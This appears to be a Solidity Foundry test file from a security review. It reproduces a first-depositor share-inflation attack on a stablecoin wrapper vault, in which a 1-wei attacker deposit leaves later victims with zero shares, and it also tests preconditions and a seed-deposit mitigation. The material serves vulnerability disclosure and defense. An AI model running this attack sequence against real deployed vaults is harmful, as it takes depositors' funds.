// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.36;

import { Stablecoin } from "../../../../../../contracts/cap/Stablecoin.sol";
import { Wrapper } from "../../../../../../contracts/cap/Wrapper.sol";
import { BaseTest } from "../../../../../../test/shared/BaseTest.sol";
import { MockERC20 } from "../../../../../../test/shared/mocks/MockERC20.sol";
import { MockIRM } from "../../../../../../test/shared/mocks/MockIRM.sol";

contract VerifyWrapperInflation is BaseTest {
    Stablecoin internal s;
    Wrapper internal w;
    MockERC20 internal usdc;
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address carol = makeAddr("carol");
    address seed = makeAddr("seed");

    function setUp() public {
        vm.warp(1_000_000);
        _setUpAccessManager();
        usdc = new MockERC20("USD Coin", "USDC", 18);
        MockIRM irm = new MockIRM();
        s = Stablecoin(
            _deployProxy(
                address(new Stablecoin()),
                abi.encodeCall(
                    Stablecoin.initialize,
                    (address(accessManager), address(usdc), "Cap USD", "cUSD", "", address(irm), address(0))
                )
            )
        );
        w = Wrapper(
            _deployProxy(
                address(new Wrapper()), abi.encodeCall(Wrapper.initialize, (address(accessManager), address(s)))
            )
        );
        _dep(alice, 1000e18);
        _dep(bob, 1000e18);
        _dep(seed, 10e18);
    }

    function _wdep(address a, uint256 amt) internal returns (uint256 sh) {
        vm.startPrank(a);
        sh = w.deposit(amt, a);
        vm.stopPrank();
    }

    function _wred(address a) internal returns (uint256 out) {
        vm.startPrank(a);
        out = w.redeem(w.balanceOf(a), a, a);
        vm.stopPrank();
    }

    function _dep(address a, uint256 amt) internal {
        usdc.mint(a, amt);
        vm.startPrank(a);
        usdc.approve(address(s), amt);
        s.deposit(amt, a);
        s.approve(address(w), type(uint256).max);
        vm.stopPrank();
    }

    function _attackerIn() internal {
        s.mintCreditBacked(carol, 1);
        vm.prank(carol);
        s.approve(address(w), 1);
        _wdep(carol, 1);
    }

    /// Reproduce, then measure residual: vault stays poisoned for the next depositor after the attacker exits.
    function test_repro_and_residual_poison() public {
        _attackerIn();
        s.fundCreditBacked(1_000e18);
        vm.warp(block.timestamp + 2 days);
        uint256 vs = _wdep(alice, 400e18);
        uint256 out = _wred(carol);
        emit log_named_uint("victim shares", vs);
        emit log_named_uint("attacker out", out);
        emit log_named_uint("wrapper supply after exit", w.totalSupply());
        emit log_named_uint("wrapper assets after exit", w.totalAssets());
        uint256 vs2 = _wdep(bob, 100e18);
        emit log_named_uint("next depositor 100e18 -> shares", vs2);
        assertEq(vs, 0);
        assertEq(vs2, 0, "vault remains a zero-share trap after attacker exits");
    }

    /// Precondition test: a single direct cUSD opt-in (no Wrapper) collapses the premium share to the Wrapper.
    function test_direct_optIn_dilutes_wrapper() public {
        vm.prank(bob); // 1000e18 cUSD staked directly
        s.optIn();
        _attackerIn();
        s.fundCreditBacked(1_000e18);
        vm.warp(block.timestamp + 2 days);
        emit log_named_uint("wrapper totalAssets (1 wei vs 1000e18 direct staker)", w.totalAssets());
        uint256 vs = _wdep(alice, 400e18);
        uint256 out = _wred(carol);
        emit log_named_uint("victim shares", vs);
        emit log_named_uint("attacker out", out);
        assertGt(vs, 399e18);
        assertLe(out, 2);
    }

    /// Mitigation test: a 10e18 protocol seed as first depositor bounds victim rounding loss to dust.
    function test_seed_first_deposit_closes_it() public {
        _wdep(seed, 10e18);
        _attackerIn();
        s.fundCreditBacked(1_000e18);
        vm.warp(block.timestamp + 2 days);
        uint256 A = w.totalAssets();
        uint256 vs = _wdep(alice, 400e18);
        uint256 fair = 400e18 * (10e18 + 1) / (A + 1);
        emit log_named_uint("victim shares", vs);
        emit log_named_uint("fair shares", fair);
        uint256 loss = 400e18 - w.previewRedeem(vs);
        emit log_named_uint("victim rounding loss (wei)", loss);
        assertGe(vs, fair - 1);
        assertLt(loss, 1e3);
        assertLe(_wred(carol), 200, "attacker with 1 wei earns ~nothing");
    }

    /// Precondition: premium funded BEFORE any wrapper deposit is frozen (staked==0) and then accrues to the first depositor.
    function test_prefunded_premium_accrues_to_first_wei() public {
        s.fundCreditBacked(1_000e18); // nobody staked: frozen
        vm.warp(block.timestamp + 30 days);
        _attackerIn();
        vm.warp(block.timestamp + 2 days);
        emit log_named_uint("wrapper totalAssets after late 1-wei deposit", w.totalAssets());
        assertGt(w.totalAssets(), 900e18);
    }
}
